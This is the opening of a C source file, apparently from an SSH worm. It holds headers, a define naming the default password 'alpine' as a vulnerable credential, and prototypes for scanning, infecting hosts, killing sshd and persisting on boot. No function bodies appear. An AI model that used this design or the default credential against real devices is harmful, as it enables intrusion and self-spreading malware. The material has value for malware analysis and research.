#include <sys/fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <syslog.h>
#include <errno.h>
#include <ifaddrs.h>
#include <string.h>

#define MAX_NUM 24
#define VULN_PASS "alpine"

void scanner(char *ipRange);
int scanHost(char* host);
int checkHost(char *host);
int runCommand(char* command, char *host);
int prunCommand(char* command, char *host);
int CopyFile(char* src, char* dst, char* host);
int ChangeOnBoot();
int KillSSHD();
int infectHost(char *host);
char *randHost(void);
int get_lock(void);
char *getAddrRange();
int tokenise (char input[], char *token[], char* spl);